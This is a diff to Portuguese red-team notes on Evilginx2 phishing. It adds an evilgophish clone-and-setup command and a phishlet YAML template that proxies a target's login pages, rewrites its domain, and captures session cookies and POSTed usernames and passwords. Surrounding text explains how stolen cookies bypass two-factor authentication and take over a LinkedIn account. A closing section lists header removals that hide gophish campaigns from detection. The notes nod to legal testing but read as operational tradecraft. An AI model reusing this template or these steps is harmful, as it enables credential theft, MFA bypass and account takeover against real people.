@@ -52,7 +52,11 @@ Este diagrama representa a movimentação de dados em tempo real. O Atacante (vo
 - lures create o365
 - lures get-url 0
 
-> Atencao! Aqui voce tem que ir para [DigitalOcean](https://github.com/miguellofredo85/Red-Team-TTP/blob/main/DigitalOcean.md) e configurar o ambiente cloud
+### Evilgophish
+git clone https://github.com/fin3ss3g0d/evilgophish.git
+cd evilgophish
+sudo ./setup.sh lab.example.com https://legitimate-site.com true YOURID true
+
 
 ### **O que é um Phishlet?**
 
@@ -72,6 +76,52 @@ Os phishlets formam a base de todos os cenários de phishing do Evilginx2. Cada 
 Os phishlets permitem que invasores (ou membros de equipes de teste de segurança, em um contexto legal) **contornem a autenticação de dois fatores (2FA)** roubando o cookie de sessão após a vítima fazer login com sucesso no serviço real — sem perceber que algo malicioso está ocorrendo. Esse é um diferencial fundamental entre o Evilginx e ferramentas de phishing mais simples.
 
 ---
+### Estrutura
+
+```
+# Example phishlet structure (simplified, educational)
+name: 'example-target'
+author: '@operator'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'target.com'
+    session: true
+    is_landing: true
+
+  - phish_sub: 'www'
+    orig_sub: 'www'
+    domain: 'target.com'
+    session: false
+
+sub_filters:
+  - triggers_on: 'login.target.com'
+    orig_sub: 'login'
+    domain: 'target.com'
+    search: 'target.com'
+    replace: 'lab.example.com'
+    mimes: ['text/html', 'application/javascript', 'application/json']
+
+auth_tokens:
+  - domain: '.target.com'
+    keys: ['session_id', 'auth_token']
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+login:
+  domain: 'login.target.com'
+  path: '/authenticate'
+```
 
 ### **Passo a passo: baixe e analise o Phishlet do WordPress.org**
 
@@ -330,3 +380,11 @@ Interação da Vítima: A vítima clica no link, vê a prévia atraente e a pág
 Captura de Dados: O Evilginx captura tudo (credenciais, cookies de sessão) em tempo real e, em seguida, redireciona a vítima para uma página inofensiva .
 
 Acesso Indevido: O atacante usa os cookies de sessão capturados para acessar a conta legítima da vítima no LinkedIn, sem precisar de senha ou MFA
+
+
+
+## odificacoes OPSEC
+**Remocao de header no gophish**
+- X-Mailer: gophish
+- X-Gophish-Contact
+- Random URL path
